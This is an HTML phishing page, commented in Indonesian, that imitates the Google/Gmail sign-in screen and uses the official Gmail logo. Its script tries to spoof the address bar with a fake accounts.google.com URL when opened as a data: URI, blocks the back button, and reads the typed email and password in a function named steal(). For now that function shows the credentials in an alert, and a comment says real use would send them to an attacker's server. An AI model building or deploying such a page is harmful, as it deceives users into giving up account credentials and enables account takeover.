<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Sign-in</title>
<style>
    /* Styling dibuat mirip Google */
    body { font-family: 'Roboto', Arial, sans-serif; background: #fff; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .container { width: 100%; max-width: 360px; padding: 20px; text-align: center; }
    .logo { width: 80px; margin-bottom: 10px; }
    h2 { font-weight: 400; font-size: 24px; margin-bottom: 5px; }
    p { font-size: 15px; color: #202124; margin-bottom: 30px; }
    input { width: 100%; padding: 13px 15px; margin-bottom: 15px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none;}
    input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
    .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; }
</style>
</head>
<body>

<div class="container">
    <!-- Logo Gmail Resmi -->
    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" class="logo">
    <h2>Sign in</h2>
    <p>to continue to Gmail</p>

    <input type="text" id="email" placeholder="Email or phone" autocomplete="off">
    <input type="password" id="password" placeholder="Password" autocomplete="off">
    
    <button class="btn" onclick="steal()">Next</button>
</div>

<script>
    // --- LOGIKA EKSPLOITASI ---

    // 1. CEK: Jika halaman ini dibuka sebagai Data URI (bukan file html biasa)
    // Kita akan memancing Address Bar agar menampilkan URL Google.
    if (window.location.protocol === 'data:') {
        
        // Trik 1: Gunakan history.replaceState (jika diizinkan)
        try {
            // Ubah URL di Address Bar tanpa reload halaman
            window.history.replaceState({}, '', 'https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com');
        } catch (e) {
            // Trik 2: Gunakan Object untuk navigasi "siluman"
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://accounts.google.com'; // Memancing browser membaca domain Google
            document.body.appendChild(iframe);
        }
    }

    // 2. Kunci History (Anti Back)
    history.pushState(null, null, location.href);
    window.onpopstate = function () { history.pushState(null, null, location.href); };

    // 3. Fungsi Pencurian Data
    function steal() {
        var e = document.getElementById('email').value;
        var p = document.getElementById('password').value;
        
        if(!e || !p) { alert("Isi dulu!"); return; }
        
        // Tampilkan bukti (di dunia nyata, kirim via fetch ke server attacker)
        alert("🔥 DATA DICURI 🔥\n\nEmail: " + e + "\nPassword: " + p + "\n\nCek Address Bar di atas!");
    }
</script>
</body>
</html>
